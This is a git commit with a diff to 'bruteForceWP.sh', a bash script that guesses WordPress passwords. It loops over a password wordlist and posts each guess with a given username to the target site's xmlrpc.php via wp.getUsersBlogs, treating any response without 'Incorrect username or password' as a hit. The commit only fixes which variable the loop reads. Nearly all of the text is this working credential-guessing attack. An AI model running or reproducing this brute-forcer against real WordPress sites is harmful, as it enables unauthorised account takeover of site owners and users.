2d7f853402b9f2c8ab8b9fad39fcec171bf4c371
j0z33 <97794280+j0z33@users.noreply.github.com>
2022-01-17 17:47:34 +0100

    Update bruteForceWP.sh

--- bruteForceWP.sh
+++ bruteForceWP.sh
@@ -7,7 +7,7 @@ if [[ ! ${host} || ! ${wordlist} || ! -f $wordlist || ! ${username}  ]]; then
 	echo -e "\n.\bruteForceWP.sh <direccon_web> <diccionario_passwords> <username>\n"
 	exit 1
 fi
-for password in $(cat $1); do
+for password in $(cat $wordlist); do
         data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$password</value></param></params></methodCall>"
         curl -s '$host/xmlrpc.php' -X POST -d $data | grep 'Incorrect username or password' &> /dev/null
         valor=$(echo $?)
